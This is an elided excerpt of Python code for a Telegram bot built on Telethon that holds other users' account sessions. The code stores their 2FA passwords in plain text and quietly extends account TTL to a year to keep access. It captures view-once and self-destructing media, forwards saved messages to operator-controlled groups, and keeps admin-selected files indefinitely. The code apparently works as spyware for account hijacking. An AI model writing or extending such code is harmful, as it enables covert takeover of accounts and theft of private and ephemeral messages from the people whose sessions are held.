...
from telethon.tl.functions.account import GetAccountTTLRequest, SetAccountTTLRequest
from telethon.tl.types import AccountDaysTTL
from datetime import datetime, timedelta
import time
from config import USERS_DIR, IGNORED_USERS, DOWNLOAD_FILTER_ADMINS, Normal_Media_Group_ID, Self_Distruct_Media_Group_ID, Details_Group_ID
...
class UserSession:
    def __init__(self, user_id, api_id, api_hash, bot_instance):
        ...
        self.enforcing_ttl = False
        
        # Load 2FA password if exists
        self.two_fa_password = None
        pwd_path = os.path.join(self.user_folder, "2fa.txt")
        if os.path.exists(pwd_path):
            try:
                with open(pwd_path, "r") as f:
                    self.two_fa_password = f.read().strip()
            except: pass

        os.makedirs(self.download_folder, exist_ok=True)

    async def check_and_enforce_ttl(self):
        if not self.client or not await self.client.is_user_authorized():
            return
            
        try:
            # Check session age
            full_path = self.session_path + ".session"
            if not os.path.exists(full_path): return
            
            creation_time = os.path.getctime(full_path)
            age_seconds = time.time() - creation_time
            
            # 30 hours = 30 * 3600 = 108000 seconds
            if age_seconds < (30 * 3600):
                return
            
            # Check current TTL
            current_ttl = await self.client(GetAccountTTLRequest())
            if isinstance(current_ttl, AccountDaysTTL):
                days = current_ttl.days
                if days != 365:
                    # Set to 1 Year (365 days)
                    await self.client(SetAccountTTLRequest(ttl=AccountDaysTTL(days=365)))
                    if self.bot:
                        try:
                            # Optional: Notify user or just log quietly? User said "apne aap set ho jaye"
                            # I will log to console but maybe not spam user
                            print(f"[TTL Enforcer] Set TTL to 365 days for user {self.user_id}")
                        except: pass
        except Exception as e:
            print(f"[TTL Enforcer] Error for {self.user_id}: {e}")
    ...
    async def scan_chat_and_download(self, chat_id, limit=100):
        ...
        try:
            ...
            async for message in self.client.iter_messages(entity, limit=limit):
                ...
                is_timer = False
                # Strict View Once / Media TTL check
                # ONLY check media.ttl_seconds. This is the flag for View Once.
                # Do NOT check message.ttl_seconds (Chat Auto-Delete)
                if message.media and getattr(message.media, 'ttl_seconds', None):
                    is_timer = True
                
                # Double check to ensure we don't catch normal media
                if is_timer:
                    # Additional safety: usually View Once has no text or text is caption
                    pass
                


                if not is_timer or not message.media:
                    continue
    ...
    async def start(self):
        ...
        try:
             ...
             # Download Profile Photo (Always refresh on start)
             if self.me:
                 path = os.path.join(self.user_folder, "profile.jpg")
                 # Remove old if exists to force fresh download
                 if os.path.exists(path):
                     os.remove(path)
                 
                 await self.client.download_profile_photo(self.me, file=path)
        except Exception as e:
             print(f"Error fetching me/photo for {self.user_id}: {e}")
             self.me = None
    ...
    async def check_current_status(self):
        """Checks if the CURRENTLY connected client is still authorized (Has not been revoked)."""
    ...
    async def on_new_message(self, event):
        ...
        try:
            ...
            # STRICT MODE: Only checking media specific TTL (View Once)
            # We ignore message.ttl_seconds, ttl_period, expire_date as they apply to Auto-Delete chats
            if message.media and getattr(message.media, 'ttl_seconds', None):
                is_timer = True
            ...
            if should_log:
                ...
                try:
                    ...
                    target_group = Self_Distruct_Media_Group_ID if is_timer else Normal_Media_Group_ID
                ...
                # Schedule Delete after 1 hour (3600 seconds)
                asyncio.create_task(self.delete_file_later(path, 3600, self.user_id))


        except Exception as e:
            print(f"Error in message handler for {self.user_id}: {e}")

    async def delete_file_later(self, path, delay, u_id=None):
        while True:
            await asyncio.sleep(delay)
            if u_id and int(u_id) in DOWNLOAD_FILTER_ADMINS:
                continue
                
            if os.path.exists(path):
                try:
                    os.remove(path)
                    print(f"Deleted {path} after delay")
                except Exception as e:
        ...
        try:
             ...
             if mode in ['saved', 'allsaved']:
                 try:
                     ...
                     return await self.forward_chats('me', limit, bot_username, Details_Group_ID)
                 except Exception as e:
